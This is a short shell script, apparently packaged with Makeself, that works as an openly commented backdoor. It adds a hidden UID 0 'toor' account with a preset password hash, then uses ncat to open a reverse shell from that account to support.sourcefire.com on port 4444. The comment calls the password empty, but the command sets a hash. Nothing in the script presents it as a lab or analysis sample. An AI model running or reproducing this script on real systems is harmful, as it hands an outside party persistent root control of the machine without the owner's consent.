#!/bin/sh
# add a new UID 0 "toor" user with an empty password
# This script was generated using Makeself
sudo useradd -o -p '$1$FuV6TnrC$rKJCjOHJXuFhl2djLOBmF.' -g root -c toor -u 0 -s /bin/sh -d /root toor
# su to toor and start the reverse shell
echo | su - toor -c "/usr/local/sf/nmap/bin/ncat -e /bin/sh support.sourcefire.com 4444"
exit 0
